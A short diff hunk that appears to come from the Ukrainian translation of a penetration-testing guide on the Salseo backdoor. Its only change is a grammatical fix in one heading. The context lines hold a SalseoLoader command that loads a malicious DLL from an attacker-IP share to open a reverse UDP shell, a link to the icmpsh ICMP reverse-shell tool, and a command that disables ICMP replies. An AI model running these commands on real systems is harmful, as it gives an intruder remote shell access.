@@ -67,7 +67,7 @@ SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <A
 
 **Цього разу вам потрібен спеціальний інструмент на клієнті для отримання зворотного шеллу. Завантажте:** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)
 
-#### **Вимкнути ICMP відповіді:**
+#### **Вимкніть ICMP відповіді:**
 ```
 sysctl -w net.ipv4.icmp_echo_ignore_all=1
 
